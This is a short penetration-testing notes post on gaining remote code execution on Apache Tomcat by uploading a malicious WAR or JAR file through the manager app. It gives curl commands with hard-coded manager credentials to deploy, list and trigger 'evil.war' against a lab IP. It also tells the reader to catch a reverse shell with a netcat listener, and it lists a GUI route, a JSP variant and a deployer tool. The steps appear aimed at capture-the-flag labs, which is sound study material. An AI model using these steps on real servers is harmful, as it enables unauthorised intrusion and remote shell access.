---
layout: post
title: Uploading malicuous JAR or WAR file
description: Uploading malicuous JAR or WAR file
summary: Uploading malicuous JAR or WAR file
tags: [devops,tomcat,java,rce,foothold]
minute: 2
---
# Overview
Attacker can deploy malicuous JAR or WAR file to gain RCE.

# Versions Tested
* Tomcat 9.0.31
* Tomcat 7.0.88 (Microsoft Windows Server 2012 R2 Standard)

# Steps - CLI
* Generate war file. See tomcat part on [[Reverse Shell and Web Shells]]
* Upload

```bash
curl -u 'webdev:password123' --upload-file evil.war 'http://10.10.163.51:8080/manager/text/deploy?path=/evil.war'
```

* Verify

```bash
curl -u 'webdev:password123' 'http://10.10.163.51:8080/manager/text/list'
```

* Open netcat listener on attacker machine
* Execute

```bash
curl -u 'webdev:password123' http://10.10.163.51:8080/evil.war
```

# Steps - GUI
* Ensure you have access to host manager app
* Create JAR file. See [[Reverse Shell and Web Shells]]
* Upload it via manager app and deploy

![](/spindel/assets/Uploading%20malicuous%20JAR%20or%20WAR%20file/B3786FC8-1BE8-49F3-8D7C-D7D5577D73D9.png)

* Open netcat listener
* Access the servlet and enjoy

```
curl -u 'bob:bubbles' http://thm:1234/evil
```

# Alernatives
* You can also upload [jsp](https://www.youtube.com/watch?v=yTHtLi9YZ2s&t=1050s) file instead of war file

![](/spindel/assets/Uploading%20malicuous%20JAR%20or%20WAR%20file/3D882918-7ECC-4D4C-8D20-0FEDF14E4C45.png)

* [Tomcat deployer](https://github.com/mgeeky/tomcatWarDeployer)
* [HTB jerry](https://www.youtube.com/watch?v=PJeBIey8gc4&t=1362s) - uploading cmd.jsp